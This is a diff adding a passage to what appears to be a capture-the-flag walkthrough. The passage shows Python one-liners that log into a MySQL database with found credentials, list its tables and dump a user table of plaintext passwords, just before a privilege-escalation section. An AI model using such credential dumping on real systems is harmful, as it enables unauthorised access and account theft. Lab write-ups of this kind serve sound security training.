@@ -259,6 +259,33 @@ SQLALCHEMY_TRACK_MODIFICATIONS = False
 
 ```
 
+```
+python3 -c "
+import pymysql
+conn = pymysql.connect(host='db', user='craft', password='qLGockJ6G2J75O', database='craft')
+cur = conn.cursor()
+cur.execute('show tables')
+print(cur.fetchall())"
+```
+
+```
+(('brew',), ('user',))
+```
+
+```
+python3 -c "
+import pymysql
+conn = pymysql.connect(host='db', user='craft', password='qLGockJ6G2J75O', database='craft')
+cur = conn.cursor()
+cur.execute('select * from user')
+print(cur.fetchall())"
+
+```
+
+```
+((1, 'dinesh', '4aUh0A8PbVJxgd'), (4, 'ebachman', 'llJ77D8QFkLPQB'), (5, 'gilfoyle', 'ZEU3N8WNM2rh4T'))
+```
+
 ---
 ## Privilege Escalation
 
